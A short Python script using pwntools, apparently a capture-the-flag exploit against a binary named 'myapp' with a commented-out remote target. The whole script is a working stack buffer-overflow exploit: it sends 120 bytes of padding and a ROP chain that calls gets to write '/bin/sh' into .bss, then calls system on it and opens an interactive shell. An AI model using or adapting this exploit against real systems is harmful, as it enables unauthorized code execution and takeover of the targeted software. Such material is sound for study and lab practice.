from pwn import *
import time

p = process('./myapp')
#p = remote('10.10.10.147',1337)

padding = 'A'*120
system = p64(0x401040)
bss = p64(0x404048)
pop_rdi = p64(0x40120b)
gets = p64(0x401060)
main = p64(0x40115f)

payload = padding + pop_rdi + bss + gets +  main 

time.sleep(5)
f = open('payload','wt')
f.write(payload)
p.sendline(payload)
time.sleep(1)
p.sendline('/bin/sh\x00')
payload = padding + pop_rdi + bss + system
time.sleep(2)
p.sendline(payload)
p.interactive()


